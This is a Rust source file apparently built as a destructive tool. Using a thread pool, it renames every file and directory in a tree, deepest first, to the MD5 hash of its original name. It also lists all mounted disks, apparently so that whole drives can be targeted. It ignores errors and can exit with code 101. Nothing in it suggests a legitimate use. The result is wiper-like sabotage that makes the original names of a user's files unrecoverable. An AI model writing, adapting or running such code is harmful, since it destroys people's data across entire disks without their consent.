use std::{fs, io};
use std::path::PathBuf;
use std::process::exit;
use std::thread::sleep;
use std::time::Duration;
use sysinfo::Disks;
use threadpool::ThreadPool;
use walkdir::WalkDir;

pub(crate) fn start_rename(path: PathBuf, do_exit: bool) {
    let cpus = num_cpus::get();
    // println!("{}", cpus);
    // let now = Instant::now();
    rename_tree(path.clone(), 2).unwrap();

    sleep(Duration::from_secs(1));


    let pool = ThreadPool::new(cpus);
    let paths = fs::read_dir(path.clone()).unwrap();
    for path in paths {
        let dir = path.unwrap();
        pool.execute(move || rename_tree(dir.path(), usize::MAX).unwrap())
    }
    pool.join();
    if do_exit {
        exit(101);
    }
    // let now2 = now.elapsed();
    // println!("{:?}", now2);
    // println!("Took {} seconds", now2.as_secs());
}

pub(crate) fn get_mount_points() -> Vec<PathBuf> {
    let disks = Disks::new_with_refreshed_list();
    let mut mount_points: Vec<PathBuf> = Default::default();

    for disk in &disks {
        mount_points.push(PathBuf::from(disk.mount_point()));
    }
    mount_points
}


fn rename_tree(start_directory: PathBuf, max_depth: usize) -> io::Result<()> {
    for entry in WalkDir::new(start_directory)
        .contents_first(true).min_depth(1).max_depth(max_depth)
        .into_iter() {
        let err = entry.is_err();
        if err { continue; }
        let path = entry.unwrap().into_path();
        // println!("{:?}", path);
        let new_path = get_new_path(path.clone());
        rename(path, PathBuf::from(new_path));
    }
    Ok(())
}

fn get_new_path(path: PathBuf) -> String {
    format!("{}/{:?}", path.parent().unwrap().to_str().unwrap(), md5::compute(
        path.file_name().unwrap().to_str().unwrap()))
}

fn rename(path: PathBuf, new_path: PathBuf) {
    let _ = fs::rename(path.clone(), new_path.clone()).is_err();
}
